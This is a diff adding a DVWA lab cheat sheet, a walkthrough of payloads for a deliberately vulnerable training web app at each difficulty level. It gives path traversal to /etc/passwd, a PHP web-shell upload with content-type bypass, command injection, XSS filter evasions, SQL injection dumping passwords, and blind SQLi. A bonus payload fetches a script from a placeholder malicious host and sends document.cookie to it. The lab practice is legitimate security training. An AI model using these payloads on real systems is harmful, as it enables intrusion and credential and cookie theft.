@@ -1,0 +1,127 @@
+Install DVWA: https://github.com/digininja/DVWA
+# Default Login DVWA #
+admin
+password
+
+
+# File Traversal #
+Eazy
+../../../../../../../../../../../../../../../../etc/passwd
+
+Medium
+/..././..././..././..././..././..././etc/passwd
+
+Hard
+file:///etc/passwd
+
+
+# File Upload #
+Eazy
+- Upload payload.php
+- Access http://localhost:4280/vulnerabilities/upload/../../hackable/uploads/payload.php?cmd=cat /etc/passwd
+
+Medium
+- Burpsuite set intercept on
+- Upload payload.php
+- Intercepted post change Content-Type: application/x-php to Content-Type: image/jpeg
+- For testing purposes also change filename="payload.php" to filename="payload123.php"
+- Forward Request
+- Access http://localhost:4280/vulnerabilities/upload/../../hackable/uploads/payload123.php?cmd=cat /etc/passwd
+
+Hard
+- Burpsuite set intercept on
+- Upload any image say dvwa_email.png
+- Intercepted post and change the content of png file from
+
+PNG
+
+...
+------WebKitFormBoundaryeGY91tmcUbjOU5xX
+to
+
+PNG
+
+<?php system($_GET["cmd"]); ?>
+------WebKitFormBoundaryeGY91tmcUbjOU5xX
+- Go to command injection section and payload 127.0.0.1|mv ../../hackable/uploads/dvwa_email.png ../../hackable/uploads/dvwa_email.php 
+http://localhost:4280/vulnerabilities/upload/../../hackable/uploads/dvwa_email.php?cmd=cat /etc/passwd
+
+
+# Reflected XSS #
+Easy
+<script>alert(document.cookie)</script>
+
+Medium
+<sc<script>ript>alert(document.cookie)</script>
+or
+<img src=x onerror=alert(document.cookie);>
+or
+<svg/onload='alert(document.cookie)'>
+
+Hard
+<img src=x onerror=alert(document.cookie);>
+or
+<svg/onload='alert(document.cookie)'>
+or
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
+//YWxlcnQoZG9jdW1lbnQuY29va2llKQ== -> alert(document.cookie) in base64 format
+
+Bonus Low-Medium
+<img src=x onerror="var s=document.createElement('sCrIpt');s.src='http://{YOUR_MALICIOUS_PAYLOAD_HOST}/payload.js';document.body.appendChild(s);">
+
+with payload.js
+//Alert Cookie
+alert(document.cookie)
+
+//Send cookie to malicious host by url
+fetch("http://{YOUR_MALICIOUS_PAYLOAD_HOST/}" + document.cookie)
+
+Bonus Run Big script like payload.js albeit input not truncated
+<img src=x onerror="eval(atob('dmFyIHBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CnZhciB4ID0gcGFyc2VJbnQocGFyYW1zLmdldCgieCIpLCAxMCk7CgppZih4ID49IDEwKQp7CiAgICBhbGVydCgiWCBpcyBoaWdoZXIgdGhhbiBlcXVhbHMgMTAiKQp9CmVsc2UKewogICAgYWxlcnQoIlggaXMgbG93ZXIgdGhhbiAxMCIpCn0='))">
+
+
+# Dom XSS #
+Easy
+<script>alert(document.cookie)</script>
+to be
+http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
+
+Medium
+</select><img src=x onerror="alert(document.cookie);">
+to be
+http://localhost:4280/vulnerabilities/xss_d/?default=</select><img src=x onerror="alert(document.cookie);">
+
+Hard
+- Bypass by carefully carefully reading the source on the php and html
+http://localhost:4280/vulnerabilities/xss_d/#default=<script>alert(document.cookie)</script>
+
+
+# Stored XSS #
+All payloads are similar from the reflected XSS, but as the dificulty is higher, xss vulnerability only can be exploited on the name parameter. On the browser the name parameter is limited 10 characters, so if we want to input more change the limit from 10 to something higher by inspecting with chrome tools/firefox tools.
+Other method is by using burpsuite and changing the request parameters directly via intercept.
+
+
+# SQLI #
+Easy
+1' union select user, password from users;-- -
+
+Medium
+- Use burpsuite to intercept and change the id values to
+1 union select user, password from users;-- -
+NOTE: Don't forget to encode it with urlencode
+
+Hard
+1' union select user, password from users;-- -
+
+
+# SQLI Blind #
+Easy
+1' AND IF(SUBSTRING((SELECT password from users WHERE user='admin'),1,1)='5',SLEEP(5),0);-- - 
+
+Medium
+- Use burpsuite to intercept and change the id values to
+1 AND IF(SUBSTRING((SELECT password from users WHERE user=CONCAT(CHAR(97), CHAR(100), CHAR(109), CHAR(105), CHAR(110))),1,1)=CHAR(53),SLEEP(5),0);-- -
+NOTE: Don't forget to encode it with urlencode
+
+Hard
+1' AND IF(SUBSTRING((SELECT password from users WHERE user='admin'),1,1)='5',SLEEP(5),0);-- -
